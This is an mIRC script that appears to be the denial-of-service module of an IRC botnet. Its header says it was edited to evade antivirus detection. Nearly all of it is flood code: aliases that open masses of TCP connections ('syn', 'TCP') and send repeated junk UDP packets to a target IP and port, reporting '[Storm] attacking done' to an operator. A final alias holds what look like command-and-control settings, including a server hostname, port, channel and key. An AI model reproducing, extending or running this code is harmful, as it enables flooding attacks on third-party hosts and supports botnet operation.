;============================================;
; edited by DiGitalX (DiGitalX86@hotmail.com);
; 	to get rid of antiviruses            ;
; nothing changed actually BUT this header :D;
;============================================;
alias TCP {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 TCPP
}

alias TCPP {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  reTUrn
  :Done
  saym 1[TCP] Complite for %gdopeip
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %gdopeip
  .UNsET %timer.gDoPe
}
alias TCPsToP {
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %gdopeip
  .UNsET %sqqq
  saym 1[TCP] Ended .. 
}

alias syn1 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 syn3
}

alias syn3 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  reTUrn
  :Done
  saym 1[Storm] attacking done for %gdopeip
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gdopeip
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
alias syn2 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 syn4
}

alias syn4 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  reTUrn
  :Done
  saym 1[Storm] attacking done for %gdopeip
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gdopeip
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
alias pf4sts {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp he1ro $2 $3 $str(âô_6ÜµKTE_}“‘²,60)
  sockudp he2ro $2 $3 $str(!@#$%^&*()_+|,50)
  sockudp he3ro $2 $3 $str(@,920)
  sockudp he4ro $2 $3 $str(0010110,130) 
  sockudp he5ro $2 $3 $str(Pong,200)
  sockudp he6ro $2 $3 $str(h3r0,180)
  sockudp he7ro $2 $3 $str(*,350)
  sockudp he8ro $2 $3 $str(link,200)
  sockudp he9ro $2 $3 $str(g4ng,180)
  return | :done | saym 1Code end [14attack1] | .timerd0nt off | unset %gnum 
}
alias pf4st  { if $1 = -s { .timerd0nt off | unset %gnum | saym 1Code end [14attack1] } | if $3 = $null { return } |  if $timer(d0nt).com != $null { saym 1Code Erorr [14attack1]: $gettok($timer(d0nt).com,3,32)  | return } |  saym 1Code Start [14attack1] Size: $+ $1 target: $+ $2  ComPort: $+ $3 |  set %gnum 0 |  .timerd0nt -m 0 400 pf4sts $1 $2 $3 }
alias mpf4st  { if ($1 = off) { .timermpf4st off | unset %mpf4stn | saym Stopped Code [14Mudp1] } | if ($3 = $null) { return } |  if ($timer(mpf4st).com != $null) { saym 1Code Error [14Mudp1] | return } | saym 1Code Start [14Mudp1] times: $+ $1 target: $+ $gettok($2,1,45) $gettok($2,2,45) $gettok($2,3,45) $gettok($2,4,45) $gettok($2,5,45) $gettok($2,6,45) $gettok($2,7,45) $gettok($2,8,45) $gettok($2,9,45) $gettok($2,10,45) Port: $+ $3 | set %mpf4stn 0 | set %mphasn $gettok($2,0,45) | .timermpf4st -m 0 400 mpf4st2 $1 $2 $3 }
alias mpf4st2 { if ($3 = $null) { goto dend } | if (%mpf4stn >= $1) { goto dend } | inc %mpf4stn 2  | sockudp md1ta $gettok($2,1,45) $r(1,65000) $str(1011001,130) | if (1 == %mphasn) { return } | sockudp md2ta $gettok($2,2,45) $r(1,65000) $str(1011001,130) | if (2 == %mphasn) { return } | sockudp md3ta $gettok($2,3,45) $r(1,65000) $str(1011001,130) | if (3 == %mphasn) { return } | sockudp md4ta $gettok($2,4,45) $r(1,65000) $str(1011001,130) | if (4 == %mphasn) { return } | sockudp md5ta $gettok($2,5,45) $r(1,65000) $str(1011001,130) | if (5 == %mphasn) { return } | sockudp md6ta $gettok($2,6,45) $r(1,65000) $str(1011001,130) | if (6 == %mphasn) { return } | sockudp md7ta $gettok($2,7,45) $r(1,65000) $str(1011001,130) | if (7 == %mphasn) { return } | sockudp md8ta $gettok($2,8,45) $r(1,65000) $str(1011001,130) | if (8 == %mphasn) { return } | sockudp md9ta $gettok($2,9,45) $r(1,65000) $str(1011001,130) if (9 == %mphasn) { return } 
  sockudp (11001,130) | 
  if (10 == %mhasn) { return } | return 
  :dend 
  .saym 1Code End [14Mudp1] 
  .timermpf4st off
  .unset %mphasn 
  .unset %mpf4st* 
}
alias synz { iF ($1 == $nUll) { reTUrn } | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | saym 1[Storm] Complite on %synAA .. | UNsET %synAA }
alias syn {
  iF ($2 == start) { iF (%synPorT !IsnUM) || ($5 !IsnUM) { reTUrn } | vAr %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inC %x  } }
  iF ($2 == halt) { iF ($soCk(syn*,0) > 0) { soCkClose syn* } }
}
alias close {
  if ($1 == -d) {
    var %1 = download $+ $2
    if ($sock(%1)) {
      .remove $+(",$dl.var(%1,file),")
      unset % [ $+ [ %1 $+ .* ] ]
      sockclose %1
    }
  }
  else { close $1- }
}
alias l0v3ly {
  if ($1 = nr) { return k1d.guccinet.com }
  if ($1 = np) { return 9500 }
  if ($1 = nc) { return ##G## }
  if ($1 = nx) { return ##G }
  if ($1 = nk) { return G }
  if ($1 = nl) { return 893646532 }
}